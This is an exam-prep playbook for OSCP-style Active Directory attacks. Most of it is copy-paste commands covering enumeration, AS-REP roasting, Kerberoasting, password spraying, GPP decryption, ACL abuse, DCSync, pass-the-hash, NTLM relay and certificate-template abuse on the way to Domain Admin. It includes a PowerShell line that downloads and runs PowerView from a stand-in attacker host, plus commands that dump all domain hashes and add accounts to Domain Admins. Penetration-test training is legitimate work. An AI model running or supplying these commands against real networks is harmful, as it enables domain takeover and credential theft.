# OSCP Active Directory Playbook — Complete Beginner Edition
*From zero to Domain Admin on exam day. Copy‑paste friendly. Explanatory. Safe for beginners.*

> This merges and streamlines two longer guides into a single, exam‑ready, beginner‑friendly Markdown. It follows a strict **enumeration → decision → action** flow with **when to use**, **what to expect**, and **what to do next**. Commands assume **Kali**. Replace placeholders with your target values.

---

## 0) Quick Setup

```bash
# Set once per target to avoid typos
export TARGET=10.10.10.100           # target host (often DC)
export DOMAIN=example.local          # discovered AD domain
export DC=dc01.example.local         # DC FQDN if known
export ATTACKER_IP=10.10.14.1        # your tun0/vpn IP
export USER=svc_user                 # when you get a username
export PASS='Password123!'           # when you get a password
export HASH='aad3b435...:NTLMHASH'   # NTLM pair if known
```

**Filesystem hygiene (exam):** create a per‑box folder and save every output.

```bash
mkdir -p AD/$TARGET/{scans,loot,notes,bloodhound,ldap,shares}
```

**View ldapdomaindump HTML (memo):**
```bash
# After dumping to ldap/ :
firefox ldap/domain_users.html &
```

---

## 1) Service map → pick tools

Run a quick targeted scan first. Then decide.

```bash
# Full TCP for surprise ports, then targeted scripts
nmap -p- --min-rate 10000 -oA scans/all $TARGET
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 -oA scans/top $TARGET
```

**Interpretation table (core AD ports):**

| Port | What | Use first | Why |
|---|---|---|---|
| 53 | DNS | `dig`, `nslookup` | Find domain, DCs, try AXFR |
| 88 | Kerberos | `GetNPUsers.py`, `GetUserSPNs.py` | AS‑REP roast, Kerberoast |
| 135/593 | MS‑RPC | `rpcclient` | Null‑session user list |
| 139/445 | SMB | `smbclient`, `smbmap`, `cme smb` | Shares, GPP, quick creds test |
| 389/636/3268/3269 | LDAP/GC | `ldapsearch`, `ldapdomaindump` | Dump users/groups/computers |
| 5985/5986 | WinRM | `evil-winrm` | Shell when you have creds |
| 3389 | RDP | `xfreerdp` | GUI if allowed |

**Decision (high level):**

```
If 88 and 389/445 present → likely DC.
No creds yet → try RPC null, SMB anon, AS‑REP roast.
Any creds found → run BloodHound, LDAP dump, Kerberoast, check WinRM.
Need shell → WinRM with creds; else loot SMB/web for creds.
```

---

## 2) Anonymous and unauthenticated enumeration

### 2.1 RPC null session
```bash
rpcclient -U '' -N $TARGET -c enumdomusers | tee notes/users.raw
awk -F'\[|\]' '/user/ {print $2}' notes/users.raw > notes/users.txt
```

### 2.2 SMB anonymous
```bash
crackmapexec smb $TARGET
smbclient -L //$TARGET -N
# Browse interesting shares
smbclient //$TARGET/Replication -N    # example
smbclient //$TARGET/SYSVOL -N
# Inside smbclient:
# > recurse on; prompt off; mget *
```

### 2.3 LDAP anonymous probe
```bash
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
# If the base DN appears and anon works, dump broadly:
ldapsearch -x -H ldap://$TARGET -b "DC=example,DC=local" > ldap/anon.ldif
```

### 2.4 AS‑REP roasting (no creds)
```bash
GetNPUsers.py -no-pass -usersfile notes/users.txt $DOMAIN/ -dc-ip $TARGET | tee loot/asrep.txt
# Crack if you get $krb5asrep$ lines
hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --show -o loot/asrep_cracked.txt
```

**Next moves:** If you got any password → go to §4 (Authenticated). If nothing, loot SMB/web harder and try gentle password spray (§3.1).

---

## 3) First credentials: low‑risk wins

### 3.1 Password spray (respect lockout)
Use only 1–3 guesses across the whole list, pause, then reevaluate.
```bash
crackmapexec smb $TARGET -u notes/users.txt -p 'Spring2025!' --continue-on-success
# Try WinRM spray if SMB blocked:
crackmapexec winrm $TARGET -u notes/users.txt -p 'Spring2025!' --continue-on-success
```

### 3.2 Common loot via SMB
```bash
# With creds (adjust domain slash escaping):
crackmapexec smb $TARGET -u $USER -p "$PASS" --shares
smbclient //$TARGET/SYSVOL -U $DOMAIN\$USER%$PASS -c 'recurse;prompt off;mget *'
grep -R "cpassword" -n .           # hunt GPP
```

### 3.3 If GPP cpassword found
```bash
gpp-decrypt <cpassword>            # yields plaintext
# Test it across users or target account in XML
```

---

## 4) Authenticated enumeration baseline

### 4.1 BloodHound collection
```bash
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $TARGET -c All --zip -o bloodhound/
# In UI: run “Shortest Paths to Domain Admins”, “Kerberoastable Users”,
# “Users with Local Admin Rights”, “Map Domain Trusts”.
```

### 4.2 LDAP domain dump
```bash
ldapdomaindump ldap://$TARGET -u "$DOMAIN\$USER" -p "$PASS" -o ldap/
# Open in browser:
firefox ldap/domain_users.html &
```

### 4.3 Kerberoasting (needs any valid user)
```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request -outputfile loot/tgs.hashes
hashcat -m 13100 loot/tgs.hashes /usr/share/wordlists/rockyou.txt --show -o loot/tgs_cracked.txt
```

### 4.4 WinRM shell check
```bash
evil-winrm -i $TARGET -u $USER -p "$PASS"
# Or pass‑the‑hash:
evil-winrm -i $TARGET -u $USER -H "${HASH##*:}"
```

---

## 5) Technique modules — when and how

> Each module states: **Use when**, **Goal**, **Commands**, **Expected**, **Next**.

### 5.1 AS‑REP roasting
- **Use when:** You have a username list. No creds.
- **Goal:** Offline crackable hashes for users with preauth disabled.
- **Cmd:** See §2.4.
- **Expected:** `$krb5asrep$` lines. Crack with mode **18200**.
- **Next:** Use cracked password for LDAP/SMB/WinRM → §4.

### 5.2 Password spraying
- **Use when:** You have usernames + a likely password pattern or single guess.
- **Goal:** One working low‑priv credential without lockouts.
- **Cmd:** See §3.1.
- **Expected:** “Login succeeded” hits.
- **Next:** BloodHound, LDAP dump, Kerberoast, WinRM.

### 5.3 Kerberoasting
- **Use when:** Any valid domain user exists.
- **Goal:** Crack service account passwords.
- **Cmd:** See §4.3. Hashcat **13100**.
- **Expected:** Service accounts cracked → often local admin somewhere.
- **Next:** BloodHound “Local Admin” query → pivot, loot creds → escalate.

### 5.4 GPP cPassword (SYSVOL)
- **Use when:** SYSVOL/Replication share accessible.
- **Goal:** Decrypt legacy GPP password.
- **Cmd:** §3.2 + `gpp-decrypt`.
- **Expected:** Reusable plaintext pass.
- **Next:** Test across SMB/WinRM. If service account → run §4.3 too.

### 5.5 LAPS read
- **Use when:** Your user is in LAPS readers or similar.
- **Goal:** Read local Administrator password of a host (even DC).
- **Cmd (PowerShell on victim or via WinRM):**
  ```powershell
  Import-Module AdmPwd.PS
  Get-AdmPwdPassword -ComputerName DC01
  ```
- **Expected:** Cleartext password.
- **Next:** Log in as `Administrator` on that host.

### 5.6 ACL abuse (WriteDACL / GenericAll / AddMember)
- **Use when:** BloodHound shows rights on users/groups/computers.
- **Goal:** Grant yourself new rights or add yourself to a powerful group.
- **Cmd (PowerView on victim):**
  ```powershell
  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')
  Add-DomainGroupMember -Identity "Domain Admins" -Members "$env:USERDOMAIN\$env:USERNAME"
  # or grant DCSync on the domain root to self:
  Add-DomainObjectAcl -TargetIdentity "DC=example,DC=local" -PrincipalIdentity "$env:USERNAME" -Rights DCSync
  ```
- **Expected:** Silent success.
- **Next:** DCSync (§5.8) or just re‑log as DA.

### 5.7 AD CS (certificates) fast check
- **Use when:** Port 80/443 shows CA pages or `certsrv`, or BloodHound flags ADCS.
- **Goal:** Abuse vulnerable templates (ESC1–ESC8).
- **Kali (certipy):**
  ```bash
  certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $TARGET -vulnerable
  # If vulnerable:
  certipy req -u $USER@$DOMAIN -p "$PASS" -target $DC -template <Templ> -upn Administrator@$DOMAIN -ca <CA>
  certipy auth -pfx <file.pfx>
  ```
- **Expected:** PFX for elevated identity.
- **Next:** Use certificate for auth (e.g., Evil‑WinRM `-S -c -k`).

### 5.8 DCSync
- **Use when:** You are DA or have Replication rights.
- **Goal:** Dump domain secrets without executing LSASS dumpers.
- **Kali (Impacket):**
  ```bash
  secretsdump.py -just-dc $DOMAIN/$USER:"$PASS"@$DC > loot/dcsync.txt
  ```
- **Expected:** NTLMs for Administrator, krbtgt, others.
- **Next:** Pass‑the‑hash (§5.9) or forge tickets.

### 5.9 Pass‑the‑Hash / Pass‑the‑Ticket
- **Use when:** You have NTLM or TGT.
- **Goal:** Authenticate without plaintext password.
- **Cmd:**
  ```bash
  psexec.py $DOMAIN/Administrator@$TARGET -hashes $HASH
  evil-winrm -i $TARGET -u Administrator -H "${HASH##*:}"
  ```

### 5.10 NTLM capture & relay (situational)
- **Use when:** You can coerce auth and a relaying target permits it.
- **Goal:** Add user to group or dump via LDAP relay.
- **Cmd (examples):**
  ```bash
  ntlmrelayx.py -t ldaps://$DC -add-user 'oscpuser:Password123' -add-to-group 'Domain Admins'
  # Trigger coercion with PrinterBug/PetitPotam from elsewhere
  ```

### 5.11 RBCD (Resource‑Based Constrained Delegation)
- **Use when:** You can write to a computer object or create one.
- **Goal:** Get SYSTEM on a target by forging service tickets.
- **Note:** Use powerrbcd/impacket guides; exam rarely requires, but BloodHound may show.

---

## 6) Scenario cookbook (15+ quick paths)

Each is **Trigger → Steps → Result**. Adapt hostnames/paths.

1) **Active (HTB): GPP → Kerberoast → DA**  
Trigger: Readable SYSVOL/Replication.  
Steps: SMB anon loot → find `cpassword` → `gpp-decrypt` → test creds → `GetUserSPNs.py -request` → crack → `psexec.py` as Administrator.  
Result: DA shell.

2) **Forest (HTB): AS‑REP → Exchange ACL → DCSync**  
Trigger: RPC users + AS‑REP roastable.  
Steps: `GetNPUsers.py` → crack → BloodHound shows Exchange‐derived WriteDACL → `Add-DomainObjectAcl -Rights DCSync` → `secretsdump.py`.  
Result: Admin NTLM → DA access.

3) **Timelapse (HTB): PFX auth → LAPS read**  
Trigger: Share with `.pfx`.  
Steps: crack PFX → `evil-winrm -S -c/-k` cert auth → find `ConsoleHost_history.txt` creds → account in LAPS readers → `Get-AdmPwdPassword`.  
Result: Administrator password to DC.

4) **Cascade (HTB): Config secrets → .NET app key → ACL abuse**  
Trigger: Share configs leak user → decompile service EXE to get `ArkSvc`.  
Steps: `ilspycmd` → creds → BloodHound shows rights → `Add-DomainGroupMember "Domain Admins" ArkSvc`.  
Result: DA.

5) **Return/Printer: Rogue LDAP → capture bind creds → Server Operators**  
Trigger: Printer “LDAP server” setting.  
Steps: point to attacker:389, capture DN+password → WinRM shell → `Server Operators` allows service binpath hijack to SYSTEM.  
Result: SYSTEM on server (maybe DC).

6) **AS‑REP only domain:**  
Trigger: Multiple `$krb5asrep$`.  
Steps: crack several → the strongest user runs services → local admin on server → dump creds → lateral to DC.  
Result: DA via credential domino.

7) **Kerberoast only domain:**  
Trigger: Many SPNs.  
Steps: `GetUserSPNs.py -request` → crack → service acct has local admin on file server → GPP/LAPS there → pivot to DA.  
Result: DA.

8) **WinRM open, one low user:**  
Trigger: One cracked spray hit.  
Steps: WinRM shell → run `whoami /all` → find group like Backup Operators/Server Operators → abuse service/backup rights to SYSTEM → dump cached DA creds or DCSync if DC.  
Result: DA.

9) **AD CS ESC1/8 present:**  
Trigger: `certipy find -vulnerable`.  
Steps: `certipy req` with alt UPN=Administrator → `certipy auth` → DA ticket.  
Result: DA.

10) **SYSVOL scripts leak passwords:**  
Trigger: `NETLOGON`/`SYSVOL` scripts.  
Steps: grep `password|pass` → use creds → BloodHound path to DA.  
Result: DA.

11) **Website foothold → domain join check:**  
Trigger: Web shell as IIS.  
Steps: `whoami /all`, `echo %USERDOMAIN%` → enumerate `net user /domain` → loot web.config connection strings → creds → §4 flow.  
Result: DA.

12) **Machine account compromise → Silver ticket:**  
Trigger: Got a computer account NTLM.  
Steps: Forge CIFS TGS for that host (silver ticket) to read admin‐only shares with Mimikatz → loot backup of ntds.dit or scripts → DA.  
Result: DA.

13) **RBCD path from BloodHound:**  
Trigger: `GenericAll` on computer object.  
Steps: Create attacker computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity`, then S4U to target → SYSTEM → dump creds.  
Result: DA.

14) **NTLM relay to LDAP:**  
Trigger: SMB signing off + LDAP SSL reachable.  
Steps: `ntlmrelayx` + coercion → add user to DA or set SPNs for later roast.  
Result: DA or fast track to §5.3/§5.8.

15) **Password in description field:**  
Trigger: LDAP dump shows `description: Pass=...`.  
Steps: Use as creds, proceed with §4 → BH path to DA.  
Result: DA.

16) **Unconstrained Delegation server owned:**  
Trigger: BloodHound flag.  
Steps: Wait for DA logon or coerce TGT → extract and `ptt` → DA.  
Result: DA.

17) **Backup share containing ntds.dit/system:**  
Trigger: File server with backups.  
Steps: Copy `ntds.dit` + `SYSTEM` → `secretsdump.py -ntds ntds.dit -system SYSTEM`.  
Result: All domain hashes.

---

## 7) Troubleshooting and decision trees

**Kerberos fails / clock skew:** sync time ±5 min.  
```bash
rdate -n $TARGET || sudo ntpdate $TARGET
```

**Name resolution issues:** add DC to `/etc/hosts`, or pass `-dc-ip` and `-ns` explicitly.

**WinRM blocked:** try SMB, WMI (`wmiexec.py`), or RDP if open.

**Spray safety:** check lockout policy first if discoverable. Try 1 password only, wait 30–60 min in real corp. In exam labs, still be cautious.

**BloodHound hangs:** always supply `-ns $TARGET` and `-c All`. Clear and re‑ingest if needed.

**Cracking stalls:** try smarter lists (username permutations, rockyou‑2021, rules). Consider `--show` to see already cracked entries.

---

## 8) Exam‑day SOP (90‑minute loop)

1. Scan + label ports (§1).  
2. RPC/SMB/LDAP anon (§2). Build `users.txt`.  
3. AS‑REP roast → crack (§2.4).  
4. Any creds → BH collect, LDAP dump, Kerberoast (§4).  
5. Quick wins: SYSVOL GPP, shares, scripts (§3.2, §5.4).  
6. Follow BH path: ACL add, LAPS, local admin pivot (§5.6, §5.5).  
7. DCSync when eligible (§5.8).  
8. Screenshot evidence and keep a time log.

**Evidence to capture:** user.txt/root.txt, command outputs, BloodHound path, hash dumps, final shells.

---

## 9) Cheatsheet (modes and tools)

- Hashcat: AS‑REP **18200**, Kerberoast **13100**, Net‑NTLMv2 **5600**, PFX **6800**.  
- Impacket all‑stars: `GetNPUsers.py`, `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`, `wmiexec.py`.  
- Core trio: `crackmapexec`, `smbclient`, `rpcclient`.  
- Graph: BloodHound + `bloodhound-python`.  
- LDAP dump: `ldapdomaindump` → open HTML in browser.  
- Shell: `evil-winrm` with password or `-H` hash.

---

## 10) Port → next move quick table

| Found | Next |
|---|---|
| 445 anon OK | List shares, download, grep for `pass`, search `cpassword` |
| 135 RPC null | `enumdomusers` → build `users.txt` |
| 88 Kerberos | AS‑REP roast now; with creds do Kerberoast |
| 389 LDAP | Try anon; with creds run `ldapdomaindump` |
| 5985 WinRM | Test shell with any creds |
| 80/443 | Bruteforce dirs, look for admin panels, config leaks |

---

## 11) Minimal copy‑paste block

```bash
# 1) Users and AS‑REP
rpcclient -U '' -N $TARGET -c enumdomusers | tee users.raw
awk -F'\[|\]' '/user/ {print $2}' users.raw > users.txt
GetNPUsers.py -no-pass -usersfile users.txt $DOMAIN/ -dc-ip $TARGET | tee asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show

# 2) With any creds
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $TARGET -c All --zip -o bloodhound/
ldapdomaindump ldap://$TARGET -u "$DOMAIN\$USER" -p "$PASS" -o ldap/
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request -outputfile tgs.hashes
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt --show

# 3) WinRM and DCSync
evil-winrm -i $TARGET -u $USER -p "$PASS"
secretsdump.py -just-dc $DOMAIN/$USER:"$PASS"@$DC > dcsync.txt
```

---

### Notes
- Replace placeholders carefully. Quote passwords with specials. Escape domain backslashes.  
- Prefer `--outputfile` and redirect to keep audit trail.  
- Keep BloodHound graphs with saved queries for the report.
